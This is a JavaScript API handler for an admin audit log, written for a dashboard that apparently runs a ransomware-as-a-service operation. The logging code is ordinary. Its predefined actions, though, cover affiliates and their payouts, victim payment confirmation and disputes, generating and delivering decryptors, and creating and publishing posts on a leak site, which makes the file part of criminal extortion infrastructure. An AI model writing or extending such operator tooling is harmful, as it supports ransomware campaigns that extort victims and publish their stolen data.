// vercel-dashboard/api/admin/audit.js
// Admin audit logging - immutable log of all admin/affiliate actions

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'admin') {
    return response.status(403).json({ error: 'Admin access required' });
  }

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Audit log error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response) {
  const { 
    page = 1, 
    limit = 50, 
    actorId, 
    action, 
    resourceType, 
    startDate, 
    endDate,
    severity 
  } = request.query;

  const pageNum = parseInt(page);
  const limitNum = parseInt(limit);

  // Get audit log entries (stored as sorted set by timestamp)
  const auditIds = await kv.zrevrange('global:audit:log', 0, -1);
  const entries = [];

  for (const id of auditIds) {
    const entry = await kv.get(`audit:${id}`);
    if (!entry) continue;

    // Apply filters
    if (actorId && entry.actorId !== actorId) continue;
    if (action && entry.action !== action) continue;
    if (resourceType && entry.resourceType !== resourceType) continue;
    if (severity && entry.severity !== severity) continue;
    if (startDate && new Date(entry.timestamp) < new Date(startDate)) continue;
    if (endDate && new Date(entry.timestamp) > new Date(endDate)) continue;

    entries.push(entry);
  }

  const start = (pageNum - 1) * limitNum;
  const paginated = entries.slice(start, start + limitNum);

  return response.json({
    entries: paginated,
    total: entries.length,
    page: pageNum,
    pageSize: limitNum,
  });
}

async function handlePost(request, response) {
  const { actorId, actorRole, action, resourceType, resourceId, details, severity = 'info', ip, userAgent } = request.body;

  if (!actorId || !action || !resourceType) {
    return response.status(400).json({ error: 'actorId, action, and resourceType required' });
  }

  const auditId = `audit_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const entry = {
    id: auditId,
    actorId,
    actorRole: actorRole || 'unknown',
    action,
    resourceType,
    resourceId: resourceId || null,
    details: details || {},
    severity, // 'info', 'warning', 'critical'
    ip: ip || request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown',
    userAgent: userAgent || request.headers['user-agent'] || 'unknown',
    timestamp: new Date().toISOString(),
  };

  // Store audit entry
  await kv.set(`audit:${auditId}`, entry);
  
  // Add to sorted set (score = timestamp for chronological ordering)
  await kv.zadd('global:audit:log', { score: Date.now(), value: auditId });
  
  // Also index by actor
  await kv.zadd(`actor:${actorId}:audit`, { score: Date.now(), value: auditId });
  
  // Index by resource
  if (resourceId) {
    await kv.zadd(`resource:${resourceType}:${resourceId}:audit`, { score: Date.now(), value: auditId });
  }

  // Index by action type
  await kv.zadd(`action:${action}:audit`, { score: Date.now(), value: auditId });

  // Index by severity
  await kv.zadd(`severity:${severity}:audit`, { score: Date.now(), value: auditId });

  // Trim old entries (keep last 100,000)
  const count = await kv.zcard('global:audit:log');
  if (count > 100000) {
    await kv.zremrangebyrank('global:audit:log', 0, count - 100000 - 1);
  }

  return response.status(201).json(entry);
}

// Helper function for other modules to log audit entries
export async function logAuditEntry(entry) {
  const auditId = `audit_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const fullEntry = {
    id: auditId,
    ...entry,
    timestamp: entry.timestamp || new Date().toISOString(),
  };

  await kv.set(`audit:${auditId}`, fullEntry);
  await kv.zadd('global:audit:log', { score: Date.now(), value: auditId });
  
  if (entry.actorId) {
    await kv.zadd(`actor:${entry.actorId}:audit`, { score: Date.now(), value: auditId });
  }
  if (entry.resourceId && entry.resourceType) {
    await kv.zadd(`resource:${entry.resourceType}:${entry.resourceId}:audit`, { score: Date.now(), value: auditId });
  }
  if (entry.action) {
    await kv.zadd(`action:${entry.action}:audit`, { score: Date.now(), value: auditId });
  }
  if (entry.severity) {
    await kv.zadd(`severity:${entry.severity}:audit`, { score: Date.now(), value: auditId });
  }

  return auditId;
}

// Pre-defined audit actions for consistency
export const AuditActions = {
  // Campaign actions
  CAMPAIGN_CREATED: 'campaign_created',
  CAMPAIGN_UPDATED: 'campaign_updated',
  CAMPAIGN_DELETED: 'campaign_deleted',
  CAMPAIGN_KEY_ROTATED: 'campaign_key_rotated',
  
  // System actions
  SYSTEM_DELETED: 'system_deleted',
  SYSTEM_STATUS_CHANGED: 'system_status_changed',
  
  // Affiliate actions
  AFFILIATE_CREATED: 'affiliate_created',
  AFFILIATE_UPDATED: 'affiliate_updated',
  AFFILIATE_SUSPENDED: 'affiliate_suspended',
  AFFILIATE_BANNED: 'affiliate_banned',
  AFFILIATE_PAYOUT_REQUESTED: 'affiliate_payout_requested',
  AFFILIATE_PAYOUT_PROCESSED: 'affiliate_payout_processed',
  
  // Payment actions
  PAYMENT_REGISTERED: 'payment_registered',
  PAYMENT_CONFIRMED: 'payment_confirmed',
  PAYMENT_DISPUTED: 'payment_disputed',
  
  // Decryptor actions
  DECRYPTOR_GENERATED: 'decryptor_generated',
  DECRYPTOR_DELIVERED: 'decryptor_delivered',
  
  // Leak site actions
  LEAK_POST_CREATED: 'leak_post_created',
  LEAK_POST_PUBLISHED: 'leak_post_published',
  LEAK_POST_DELETED: 'leak_post_deleted',
  
  // Settings actions
  SETTINGS_CHANGED: 'settings_changed',
  API_KEY_CREATED: 'api_key_created',
  API_KEY_REVOKED: 'api_key_revoked',
  
  // Access actions
  LOGIN_SUCCESS: 'login_success',
  LOGIN_FAILED: 'login_failed',
  UNAUTHORIZED_ACCESS: 'unauthorized_access',
  
  // Data actions
  DATA_EXPORTED: 'data_exported',
  DATA_DELETED: 'data_deleted',
};

export const AuditSeverity = {
  INFO: 'info',
  WARNING: 'warning',
  CRITICAL: 'critical',
};

export const ResourceTypes = {
  CAMPAIGN: 'campaign',
  SYSTEM: 'system',
  AFFILIATE: 'affiliate',
  PAYMENT: 'payment',
  DECRYPTOR: 'decryptor',
  LEAK_POST: 'leak_post',
  TICKET: 'ticket',
  API_KEY: 'api_key',
  SETTINGS: 'settings',
};